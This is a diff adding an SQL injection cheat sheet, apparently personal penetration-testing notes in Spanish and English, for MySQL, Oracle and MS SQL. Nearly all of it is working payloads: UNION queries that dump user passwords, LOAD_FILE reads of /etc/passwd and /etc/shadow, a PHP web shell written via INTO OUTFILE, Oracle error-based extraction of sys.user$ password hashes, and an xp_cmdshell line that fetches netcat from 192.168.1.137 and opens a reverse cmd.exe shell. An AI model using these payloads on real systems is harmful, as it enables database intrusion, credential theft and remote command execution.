@@ -1,0 +1,165 @@
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+MySQL :
+    
+' union select all null,concat(user_id,password) from users; -- 
+Deben tener el mismo numero de columnas el query que esta en la aplicacion y el que se agrega con la inyeccion.
+En este caso era :
+    $getid="SELECT first_name, last_name FROM users WHERE user_id = '$id'";   ---> app modelo
+El espacio antes de los -- y el espacio despues de ellos si cuenta.
+El concat cuenta como un campo, por eso, requiere el null para tener dos campos en ambos query.
+
+Otros mas basados en UNION :
+' union SELECT null,LOAD_FILE(0x2f6574632f706173737764); #   ---->Lista el /etc/passwd 
+' union SELECT null,LOAD_FILE(0x2f6574632f736861646f77); # /etc/shadow
+' union select 1,2,3; -- ---> Daria un error para la app modelo pero ayuda a saber cuantas columnas se consultan en su query.  1,2 no daria error
+' union select null,concat(user,password) from dvwa.users limit 0,1 --   ---> Lista registro por registro iniciando en cero
+1' union select user_id,password from users; --  ---> Simple, sin concat
+' UNION ALL SELECT user,password FROM mysql.user; --   ---> listar usuarios y passwords del sistema de mysql
+' UNION SELECT NULL,concat(user, ' - ',password) AS username FROM users LIMIT 1,1; --    ----> Salida formateada
+' union all SELECT table_schema,table_name FROM information_schema.tables; --   ----> Listar tablas que maneja este servidor de MySQL (prestar atencion a la notacion instancia.tabla porque la aplicacion esta usando otra instancia normalmente)
+' union all select table_name, column_name FROM information_schema.columns WHERE table_schema != 'mysql' AND table_schema != 'information_schema'
+----> Listar columnas de la base de datos actual (la de la aplicacion vulnerable) SI es que se puede listar el information_schema.  Filtra las columnas no deseadas.
+' union all select null,column_name from information_schema.columns where table_schema = 'dvwa' and table_name = 'users'; -- --> Igual que el anterior.
+' union all SELECT grantee,privilege_type FROM information_schema.user_privileges; --  ---> Listar privilegios sobre tablas
+' UNION SELECT 'test','123' INTO OUTFILE 'testing1.txt ----> Crear el archivo en /var/lib/mysql/dvwa/
+a' UNION ALL SELECT null,@@version;#  ----> mysql version
+a' UNION SELECT null,database() #  ----> base de datos del programa
+a' UNION ALL SELECT system_user(),user();#  ----> usuario corriendo el engine
+' UNION SELECT '', '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/tmp/shell.php';#  ----->  Shell upload, no funciona siempre porque el usuario mysql requiere derechos sobre el directorio donde se grabe y ese directorio debe ser accesable por el web
+
+
+Otros como ORDER BY :
+1' ORDER BY 3;#  ---> En la app modelo da error y se puede conocer asi la cantidad de columnas en el query de la app'
+
+select schema_name from information_schema.schemata;
++--------------------+
+| schema_name        |
++--------------------+
+| information_schema |
+| clientes           |
+| proveedores        |
+| planilla           |
++--------------------+
+
+select table_name from information_schema.tables where table_schema = 'planilla';
++------------+
+| table_name |
++------------+
+| gerentes   |
+| comunes    |
+| temporales |
++------------+
+
+select column_name from information_schema.columns where table_schema = 'planilla' and table_name = 'gerentes';
++---------------------+
+| column_name         |
++---------------------+
+| codigo              |
+| area                |
+| sueldobruto         |
++---------------------+
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+ORACLE
+
+' UNION all SELECT USER,1,2,3 FROM DUAL -- 
+Tipo de error:
+Microsoft OLE DB Provider for Oracle (0x80004005)
+ORA-01789: query block has incorrect number of result columns
+/RelacionS_01r.asp, line 63
+
+' UNION SELECT USER,SYS.DATABASE_NAME,NULL FROM DUAL -- 
+retorna usuario e instancia
+
+' AND UTL_INADDR.GET_HOST_NAME((SELECT USER FROM DUAL)) IS NOT NULL -- 
+Retorna usuario actual en mensaje de error
+Tipo de error:
+Microsoft OLE DB Provider for Oracle (0x80004005)
+ORA-29257: host EXTRANET unknown ORA-06512: at "SYS.UTL_INADDR", line 4 ORA-06512: at "SYS.UTL_INADDR", line 35 ORA-06512: at line 1
+/RelacionS_01r.asp, line 63
+
+' UNION SELECT USERNAME, TO_CHAR(USER_ID),NULL FROM ALL_USERS -- 
+' UNION SELECT USERNAME, TO_CHAR(USER_ID),NULL FROM ALL_USERS WHERE ROWNUM<=40 -- 
+retorna usuarios y uid
+cuando se coloca ROWNUM es como limit de mysql
+
+' UNION SELECT NULL,USERNAME,TO_CHAR(CREATED) FROM ALL_USERS WHERE USERNAME LIKE '%SYS%' -- 
+retorna usuarios del sistema y fecha de creacion
+
+' UNION SELECT TABLE_NAME,NULL,NULL FROM ALL_TABLES -- 
+lista todas las tablas
+
+' OR 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT BANNER FROM V$VERSION WHERE ROWNUM=1)) -- 
+muestra version de oracle en error
+
+' UNION SELECT OWNER,TABLE_NAME, TABLESPACE_NAME FROM DBA_TABLES -- 
+' UNION SELECT OWNER,TABLE_NAME, TABLESPACE_NAME FROM ALL_TABLES WHERE ROWNUM<=40 --  
+eso como usuario system
+
+' UNION SELECT NULL,NULL,UTL_INADDR.GET_HOST_ADDRESS FROM DUAL -- 
+direccion IP privada
+
+' UNION SELECT USERNAME, TO_CHAR(USER_ID),NULL FROM ALL_USERS WHERE USERNAME LIKE '%SCOTT%' -- 
+Validando que exista Scott, ie, cuentas default
+
+' UNION SELECT NULL,NULL,A.TABLE_NAME||'['||COUNT(*)||']='||NUM_ROWS FROM USER_TAB_COLUMNS A, USER_TABLES B WHERE A.TABLE_NAME=B.TABLE_NAME GROUP BY A.TABLE_NAME,NUM_ROWS -- 
+numero de filas y columnas en cada tabla
+
+' UNION SELECT null,null,B.OWNER||'.'||A.TABLE_NAME||'['||COUNT(*)||']='||NUM_ROWS FROM ALL_TAB_COLUMNS A, ALL_TABLES B WHERE A.TABLE_NAME=B.TABLE_NAME GROUP BY B.OWNER,A.TABLE_NAME,NUM_ROWS -- 
+propietario, tabla, columnas, filas
+
+' UNION SELECT null,null,TABLE_NAME||':'||COLUMN_NAME||':'||DATA_TYPE||':'||COLUMN_ID FROM USER_TAB_COLUMNS a ORDER BY a.TABLE_NAME,a.COLUMN_ID -- 
+
+' and  chr(44)=SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;
+BEGIN EXECUTE IMMEDIATE '''' select user from dual where utl_inaddr.get_host_name((select name||chr(44)||password from sys.user$ where rownum=1)) is not null'''';END;'';END;--','SYS',0,'1',0) -- 
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+MS SQL
+
+convert(int,(CHAR(95)+CHAR(33)+CHAR(64)+CHAR(50)+CHAR(100)+CHAR(105)+CHAR(108)+CHAR(101)+CHAR(109)+CHAR(109)+CHAR(97)))+'
+
+Column tables enumeration :
+' having 1=1--
+Show error : Column tablename.tablecol_1 is invalid in the select list because it is not contained in an aggregate function and there is no GROUP BY clause.
+
+Now, take that column name as in :
+' group by tablename.tablecol_1 having 1=1--   ----> This will show next column name and so on.
+
+' group by tablename.tablecol_1, tablename.tablecol_2 having 1=1--
+
+Now, to get the data type of every column, you may use a union select with sum and got an error showing the correct type :
+    
+' union select sum(tablecol_1) from tablename --  
+
+I'll drop an error : The sum or average aggregate operation cannot take a varchar data type as an argument.  ----> now, you know tablecol_1 is varchar
+
+Then, do the same for every column
+
+Just to verify, insert a row :
+
+' insert into tablename values('31337','wcuestas','aicila97','wtf')--
+
+Next, using Stored Procedures :
+    
+';exec sp_makewebtask "c:\Inetpub\wwwroot\query.html","select * from tablename";--   ----> It'll generate a page with a query of all columns from tablename and store it in query.html.  If we are using a login form, forget about the error message (access denied or so).
+
+';exec master..xp_cmdshell '"ipconfig" > c:\Inetpub\wwwroot\ip.txt';--   ----> It'll execute ipconfig command and put the result in ip.txt
+
+Now, using it to upload and run netcat to attacker machine :
+';exec master..xp_cmdshell 'tftp -i 192.168.1.137 get wca-nc.exe && wca-nc.exe 192.168.1.137 53 -e cmd.exe';--    ---->Also, there is a netcat listening on port 53 of 192.168.1.137
+ONLY MEMBERS OF SYSADMIN fixed server role can use this command
+
+MS SQL Server 2005
+SELECT name, cast (password_hash as varbinary(256)) FROM sys.sql_logins
+select * from sys.sysobjects where name like'xp%' order by name
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+GENERAL
+
+Averiguar nombre de base de datos
+
+' union select 1,2,3 from tbl_que_no_existe #
+
+Arroja mensaje de error donde se puede ver el nombre de la base de datos :
+
+Table 'web_database.tbl_que no existe' doesn't exist
